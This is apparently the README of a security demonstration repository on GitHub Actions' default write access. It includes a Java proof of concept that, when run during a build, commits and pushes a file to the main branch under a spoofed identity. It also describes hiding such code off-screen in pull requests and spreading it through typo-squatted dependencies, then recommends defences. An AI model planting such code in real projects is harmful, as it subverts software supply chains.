# Musical-Okto-Carnival

GitHub Actions by default allow any code executed as part of the action, except
when running as part of a PR from a forked repository, to commit changes to the
main branch. This is exceedingly dangerous and could allow the introduction of
malicious code into the source code repositories of widely used software.

GitHub provides repository owners a lot of control over what GitHub Actions
have access to; this has only been strengthend in recent months due to
[BitCoin mining attacks](https://www.coindesk.com/hackers-mined-crypto-on-githubs-servers-report).
However, one still must excersize a little caution and harden any repository
that uses GitHub Actions.

TL;DR - just install [AllStar](https://github.com/ossf/allstar/blob/main/quick-start.md)
and follow the guidance.

## Attacking Repositories on GitHub

Imagine a scenario where a maintainer of a widely used OSS package goes rogue
and decides they want to start spreading malicious code. For instance, if the
primary maintainer of [OWASP dependency-check](https://github.com/jeremylong/DependencyCheck)
decided to abuse the trust so many users have given the tool over the years.
What if the following code were introduced and called as part of the execution
of dependency-check:

```java
    private void provideWarning() {
        String ref = getEnv("GITHUB_REF", "");
        boolean isAction = Boolean.parseBoolean(getEnv("GITHUB_ACTIONS", "false"));
        boolean notPR = getEnv("GITHUB_HEAD_REF", "").isEmpty();
        boolean isMain = "refs/heads/main".equals(ref);
        boolean isMaster = "refs/heads/master".equals(ref);
        java.io.File f = new java.io.File("warning.md");

        if (isAction && notPR && (isMain || isMaster) && !f.exists()) {
            try (java.io.FileWriter writer = new java.io.FileWriter(f);
                    java.io.BufferedWriter out = new java.io.BufferedWriter(writer)) {
                out.write("Warning\n");
                out.write("=======\n\n");
                out.write("Branch protection is not enabled and GitHub Actions has the\n");
                out.write("ability to write to the repository. Any action or code executed\n");
                out.write("during the build, even code in third party dependencies called\n");
                out.write("during testing, could subvert the integrity of your project.\n\n");
                out.write("See [Disabling or limiting GitHub Actions for a repository]");
                out.write("(https://docs.github.com/en/github/administering-a-repository/managing-repository-settings/disabling-or-limiting-github-actions-for-a-repository) ");
                out.write("for more information on how to protect you repository.");
                out.flush();
                out.close();
            } catch (java.io.IOException ex) {
                //ignore
            }
            exec("git config user.email \"actions@github.com\"");
            exec("git config user.name \"GitHub Actions\"");
            exec("git add warning.md");
            exec("git commit -m \"warning\" warning.md");
            if (isMain) {
                exec("git push origin main");
            } else {
                exec("git push origin master");
            }
        }
    }
    // The rest of the code is trivial helper functions used to make the example above more concise.
    private String getEnv(String name, String def) {
        String ret = System.getenv(name);
        if (ret == null) {
            ret = def;
        }
        return ret;
    }

    private void exec(String cmd) {
        try {
            Runtime run = Runtime.getRuntime();
            Process pr = run.exec(cmd);
            Thread in = new ProcessReader(pr.getInputStream());
            Thread err = new ProcessReader(pr.getErrorStream());
            in.start();
            err.start();
            if (pr.isAlive()) {
                pr.waitFor();
            }
            in.join();
            err.join();
        } catch (java.io.IOException | InterruptedException ex) {
            //ignore
        }
    }

    static class ProcessReader extends Thread {
        java.io.InputStream inputStream;
        byte[] buffer = new byte[1024];

        ProcessReader(java.io.InputStream inputStream) {
            this.inputStream = inputStream;
        }

        @Override
        public void run() {
            try {
                int read;
                do {
                    read = inputStream.read(buffer);
                } while (read != -1);
            } catch (java.io.IOException ex) {
                //ignore
            }
        }
    }
```

The above code example is lengthy for completness - but at its core it simply:

1. Validates that it is running as a GitHub Action running on the `main` or
   `master` branch.
2. If it is in the correct execution context it then writes a `warning.md`
   file into the root of the repository.
3. The `warning.md` is then added to git, committed to git, and then pushed
   to the `main` or `master` branch.

While the example is mostly harmless, it demonstrates how dangerous the default
permissions can be. One could add or modify code within the repository and the
commits could impersonate one of the contributers (all you need is their email
address) instead of the above code just using `actions@github.com`. Detecting
the introduction of the injected code could be difficult. A real attacker could
even check if the code was executing right after a merge event so maintainers
would have to do a pull anyway before being able to update.

The example code above could be introduced into any dependency, GitHub Action
from the marketplace, or really any code that is executed withinva GitHub
Action. Imagine the number of repositories that could be compromised if code
like the example above were introduced into JUnit or other testing framework.

## In Action

### Act 1

To see the payload in action, the code was added in
[PR #1](https://github.com/jeremylong/musical-octo-carnival/pull/1).

When run as part of the build of main the repository now has a `warning.md`.

As the PR indicates, the "attack" was done in plain site. There are numerous
ways to mask the attack. The easiest would be to include a subverted dependency;
one could even create a look-a-like/typo-squated dependency to make it easier
to introduce the code.

### Act 2

With [PR #2](https://github.com/jeremylong/musical-octo-carnival/pull/2) the
"malicious" code was cleaned up and the `warning.md` removed. Who needs that
cumbersome branch protection.

### Act 3

In Act 3 / [PR #3](https://github.com/jeremylong/musical-octo-carnival/pull/3)
the "malicious" code was re-introduced. This time hidden and completely
missed during the peer review due to the Unified view not have any indication
that there is code way off on the right starting at character 160. See the PR
for the example. This is just another way malicious code can be introduced.

It is recommended to use the "Split" view when reviewing a PR. Alternatively,
use a tool like Checkstyle with a line length check enabled and anotate your
PRs with the [Violations-to-GitHub-Comment](https://github.com/tomasbjerre/violation-comments-to-github-command-line)
utility. The OWASP dependency-check project uses the violations maven plugin;
[example here](https://github.com/jeremylong/DependencyCheck/blob/fc010a869aee54d7fd0357a95f9c5b2da2597363/.github/workflows/pull_requests.yml#L31).

### Act 4

With Act 4 / [PR #4](https://github.com/jeremylong/musical-octo-carnival/pull/3)
we implement AllStar. Hopefully, the maintainer will actually resolve the
[issues](https://github.com/jeremylong/musical-octo-carnival/issues).

## Solutions

GitHub already has (almost) everything in place a user needs to secure their
repositories. Repository owners can enable branch protection or change the
default permissions on Actions to be read-only via the workflow yaml or using
a personal access token.

The recent introduction of [AllStar](https://github.com/ossf/allstar/blob/main/quick-start.md)
is awesome! AllStar will examine an organization or repository and alert
if any issues are discovered. However, tools like AllStar require users to
opt-in. As anyone in security knows when you start asking people to opt-in
you are doomed to fail. With AllStar we aren't just asking them to opt-in
to security, but we are asking them to opt-in just for a security notification.
At least AllStar is persistent and will continue to ping until the [issue(s)
are resolved](https://github.com/jeremylong/musical-octo-carnival/issues/6#issuecomment-903055210).

The best solution would be to make Actions secure by default. This could be
done by changing the default permission level for GitHub Actions to be read-only.
Making this change would obviously be difficult as it would end up breaking
a lot of builds. However, the default GitHub Action permissions on all new
repositories created should be made read-only. In order to do this GitHub
would need to introduce a way to control the default permissions beyond
just those for Pull Requests from forked repositories; currently the only
way to make an Action read-only is to provide a limited access token or
to use the `permissions` tag in the yaml. In most cases, Actioms do not
need the ability to write to a repository and for those that do one can
simply add the write permission in the yaml defining the Action.

Another solution available to GitHub would be to move the functionality of
AllStar from an Action in the Marketplace to an integral part of GitHub
just like was done with dependabot. As such, all repository owners could
be alerted, just like dependabot, if their repository is setup insecurely.
The warnings could be displayed only to the repository owners and provide
two buttons to assist with resolution:

1. Enable Branch Protection
2. Change Default Permissions to read-only

## End Scene

In summary, for now use [AllStar](https://github.com/ossf/allstar/blob/main/quick-start.md)
and secure your GitHub repos. When performing Peer Review - consider using
the `Split` view or using some other tool to detect long lines.
